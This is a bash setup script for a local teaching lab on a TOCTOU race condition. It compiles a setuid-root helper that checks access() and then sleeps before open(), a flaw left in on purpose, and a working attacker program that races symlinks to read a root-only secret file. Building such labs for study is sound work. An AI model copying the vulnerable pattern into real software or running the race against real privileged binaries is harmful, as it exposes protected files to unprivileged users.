#!/bin/bash
set -e

LABDIR="${1:-/tmp/toctou-lab}"
rm -rf "$LABDIR"
mkdir -p "$LABDIR"
cd "$LABDIR"

echo "SAFE_DATA" > safe.txt
echo "SECRET_DATA" > secret.txt
chmod 644 safe.txt
chmod 600 secret.txt

# Make secret.txt root-only so a normal user cannot read it.
if [ "$(id -u)" -eq 0 ]; then
    chown root:root secret.txt
else
    sudo chown root:root secret.txt
    sudo chmod 600 secret.txt
fi

cat > helper.c <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "usage: %s <path>\n", argv[0]);
        return 1;
    }
    const char *path = argv[1];

    if (access(path, R_OK) != 0) {
        perror("access");
        return 1;
    }

    usleep(1000);

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    char buf[4096];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0) {
        if (write(STDOUT_FILENO, buf, n) != n) {
            perror("write");
            break;
        }
    }
    if (n < 0) perror("read");
    close(fd);
    return 0;
}
EOF

cat > attacker.c <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <signal.h>
#include <errno.h>

#define SAFE   "safe.txt"
#define SECRET "secret.txt"
#define LINK   "target"

static void swap_loop(void) {
    for (;;) {
        unlink(LINK);
        if (symlink(SAFE, LINK) != 0) perror("symlink safe");
        unlink(LINK);
        if (symlink(SECRET, LINK) != 0) perror("symlink secret");
    }
}

int main(void) {
    pid_t swapper = fork();
    if (swapper < 0) { perror("fork"); return 1; }
    if (swapper == 0) {
        swap_loop();
        _exit(0);
    }

    usleep(10000);

    for (int i = 0; i < 2000; i++) {
        pid_t child = fork();
        if (child < 0) { perror("fork"); break; }
        if (child == 0) {
            char *args[] = {"./helper", LINK, NULL};
            execv("./helper", args);
            perror("execv");
            _exit(1);
        }
        int status;
        waitpid(child, &status, 0);
    }

    kill(swapper, SIGKILL);
    waitpid(swapper, NULL, 0);
    return 0;
}
EOF

cat > Makefile <<'EOF'
CC      = gcc
CFLAGS  = -Wall -Wextra -O2

all: helper attacker

helper: helper.c
	$(CC) $(CFLAGS) -o $@ $<

attacker: attacker.c
	$(CC) $(CFLAGS) -o $@ $<

clean:
	rm -f helper attacker
EOF

make

# Make helper setuid root
if [ "$(id -u)" -eq 0 ]; then
    chown root:root helper
    chmod u+s helper
else
    sudo chown root:root helper
    sudo chmod u+s helper
fi

echo "Lab prepared in $LABDIR"
echo "Run: cd $LABDIR && ./attacker | grep SECRET"
